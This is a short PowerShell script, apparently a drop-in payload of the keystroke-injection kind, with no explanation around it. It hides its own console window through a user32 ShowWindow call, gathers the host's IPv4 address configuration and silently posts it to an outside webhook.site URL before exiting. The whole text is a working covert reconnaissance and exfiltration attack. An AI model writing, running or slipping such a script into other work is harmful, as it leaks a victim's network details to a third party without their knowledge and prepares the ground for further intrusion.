$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

$string = get-netipaddress -addressfamily ipv4 | out-string
invoke-webrequest -Uri https://webhook.site/d8e24cd1-bcf8-4e9a-88c5-734ccf47ea26 -Method POST -Body $string
exit